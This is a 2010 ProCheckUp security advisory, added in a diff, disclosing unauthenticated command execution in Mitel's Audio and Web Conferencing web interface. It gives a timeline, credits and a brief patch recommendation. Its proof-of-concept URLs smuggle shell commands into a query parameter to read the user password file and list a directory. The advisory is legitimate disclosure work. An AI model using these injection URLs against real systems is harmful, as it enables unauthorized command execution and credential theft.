@@ -1,0 +1,49 @@
+http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-14
+
+PR10-14 Unauthenticated command execution within Mitel's AWC (Mitel
+Audio and Web Conferencing)
+
+Advisory publicly released: Tuesday, 21 December 2010
+Vulnerability found: Wednesday, 21 July 2010
+Vendor informed: Monday, 26 July 2010
+Severity level: High/Critical
+Credits
+Jan Fry of ProCheckUp Ltd (www.procheckup.com)
+Description
+Mitel Audio and Web Conferencing (AWC) is a simple, cost-effective and
+scalable audio and web conferencing solution supporting upto 200 ports.
+http://www.mitel.com/DocController?documentId=26451
+ProCheckUp has discovered that the AWC web user interface is vulnerable
+to an unauthenticated command execution attack.
+Proof of concept
+The following demonstrate the command execution flaw:
+
+1) Vulnerable to command execution
+
+To read the user password file
+http://target-domain.foo/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26cat
+%20%22/usr/awc/www/users%22%26
+
+To perform a directory listing
+http://target-domain.foo/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26ls%
+20%22/usr/awc/www/cgi-bin/%22%26
+
+Consequences:
+Command execution allows Unix commands to be remotely executed with the
+permissions associated with the web service account. No authentication
+is required to exploit this vulnerability.
+How to fix
+Ensure that the latest patches have been installed.
+References
+
+Legal
+Copyright 2010 ProCheckUp Ltd. All rights reserved.
+
+Permission is granted for copying and circulating this Bulletin to the
+Internet community for the purpose of alerting them to problems, if and
+only if, the Bulletin is not edited or changed in any way, is attributed
+to Procheckup, and provided such reproduction and/or distribution is
+performed for non-commercial purposes.
+
+Any other use of this information is prohibited. Procheckup is not
+liable for any misuse of this information by any third party.
